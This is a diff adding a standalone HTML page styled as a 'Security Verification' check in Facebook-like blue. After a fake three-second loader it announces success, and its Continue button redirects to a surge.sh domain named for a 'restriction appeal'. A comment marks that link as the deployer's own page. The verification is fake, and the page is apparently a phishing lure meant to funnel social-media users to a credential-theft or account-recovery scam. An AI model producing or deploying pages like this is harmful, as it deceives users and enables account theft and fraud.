@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Verification</title>
+<style>
+body{
+  margin:0;
+  font-family:Arial, sans-serif;
+  background:#f0f2f5;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+.card{
+  background:#fff;
+  padding:35px;
+  border-radius:12px;
+  box-shadow:0 6px 20px rgba(0,0,0,0.1);
+  text-align:center;
+  width:350px;
+}
+.loader{
+  border:6px solid #eee;
+  border-top:6px solid #1877f2;
+  border-radius:50%;
+  width:60px;
+  height:60px;
+  margin:0 auto 20px;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{
+  0%{transform:rotate(0deg);}
+  100%{transform:rotate(360deg);}
+}
+button{
+  padding:10px 25px;
+  background:#1877f2;
+  border:none;
+  color:#fff;
+  border-radius:6px;
+  cursor:pointer;
+  display:none;
+}
+button:hover{
+  background:#145dbf;
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="loader" id="loader"></div>
+  <h3 id="text">Running security check...</h3>
+  <button id="continueBtn">Continue</button>
+</div>
+
+<script>
+setTimeout(()=>{
+  document.getElementById("loader").style.display="none";
+  document.getElementById("text").innerText="Verification completed successfully.";
+  document.getElementById("continueBtn").style.display="inline-block";
+},3000);
+
+document.getElementById("continueBtn").addEventListener("click",()=>{
+  window.location.href="https://here-remove-your-restriction-appeal.surge.sh/"; // apni website ka page
+});
+</script>
+
+</body>
+</html>
